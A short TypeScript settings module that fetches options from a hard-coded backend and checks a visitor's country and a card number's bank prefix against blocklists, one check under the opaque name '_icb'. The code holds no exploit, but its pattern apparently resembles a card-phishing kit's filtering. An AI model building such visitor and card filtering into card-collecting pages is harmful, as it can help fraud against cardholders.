/**
 * Settings - Replaces Firebase-based settings
 * Uses REST API instead of Firestore
 */

// API connects to VPS backend via Nginx proxy
// Force correct URL - override any legacy env variable pointing to old IP
const _rawUrl = import.meta.env.VITE_API_URL || 'https://qtesnd.com/api-backend';
const API_BASE = (_rawUrl.includes('187.124.33.94') || _rawUrl.includes('localhost:3001'))
  ? 'https://qtesnd.com/api-backend'
  : _rawUrl;

let cachedPublicSettings: Record<string, any> | null = null;

/** Fetch public settings (no auth required) */
async function fetchPublicSettings(): Promise<Record<string, any>> {
  if (cachedPublicSettings) return cachedPublicSettings;
  try {
    const res = await fetch(`${API_BASE}/api/visitors/public-settings`);
    if (res.ok) {
      cachedPublicSettings = await res.json();
      return cachedPublicSettings!;
    }
  } catch {
    // silent
  }
  return {};
}

/** Check if country is allowed (isCountryBlocked setting) */
export async function isCountryAllowed(country: string): Promise<boolean> {
  try {
    const settings = await fetchPublicSettings();
    const blockedCountries: string[] = Array.isArray(settings.blockedCountries)
      ? settings.blockedCountries
      : (settings.blockedCountries ? JSON.parse(settings.blockedCountries) : []);
    return !blockedCountries.includes(country);
  } catch {
    return true; // Allow by default
  }
}

/**
 * Check if a card BIN (first 4-6 digits) is blocked.
 * Returns true if the card is BLOCKED (should be rejected).
 */
export async function _icb(cardNumber: string): Promise<boolean> {
  try {
    const settings = await fetchPublicSettings();
    const blockedPrefixes: string[] = Array.isArray(settings.blockedBankPrefixes)
      ? settings.blockedBankPrefixes
      : (settings.blockedBankPrefixes ? JSON.parse(settings.blockedBankPrefixes) : []);
    
    if (blockedPrefixes.length === 0) return false;
    
    const cleanNumber = cardNumber.replace(/\s/g, '');
    return blockedPrefixes.some(prefix => cleanNumber.startsWith(prefix));
  } catch {
    return false; // Allow by default
  }
}
